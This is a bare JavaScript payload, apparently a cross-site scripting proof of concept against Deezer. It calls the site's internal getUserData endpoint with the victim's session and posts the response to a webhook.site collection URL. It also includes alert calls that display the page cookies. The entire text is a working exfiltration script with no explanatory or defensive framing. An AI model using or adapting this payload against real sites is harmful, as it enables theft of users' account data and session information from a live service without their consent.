fetch('https://www.deezer.com/ajax/gw-light.php?method=deezer.getUserData&input=1&api_version=1.0&api_token=')
  .then(r => r.text())
  .then(d => fetch('https://webhook.site/d699ea0b-e69e-44af-88bf-03cd8d40bebb', {method:'POST', body:d}))

alert(d);
alert(document.cookie);